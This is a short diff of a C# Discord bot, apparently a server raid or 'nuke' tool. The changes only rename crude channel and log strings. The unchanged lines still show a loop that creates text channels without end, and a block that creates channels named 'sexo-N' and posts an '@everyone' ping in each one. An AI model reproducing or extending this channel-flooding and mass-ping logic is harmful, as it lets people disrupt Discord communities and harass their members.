@@ -51,7 +51,7 @@ namespace DiscordBot.Comandos
 
             while (true)
             {
-                string channelName = $"sexo-{canalCount}";
+                string channelName = $"Canal-{canalCount}";
                 canalCount++;
 
                 try
@@ -115,7 +115,7 @@ namespace DiscordBot.Comandos
                         {
                             var channel = await guild.CreateTextChannelAsync($"sexo-{i}");
                             await channel.SendMessageAsync("@everyone icaruh");
-                            Console.WriteLine($"18cm mole -{i} criado");
+                            Console.WriteLine($"Canal -{i} criado");
                         }
                         catch (Exception ex)
                         {
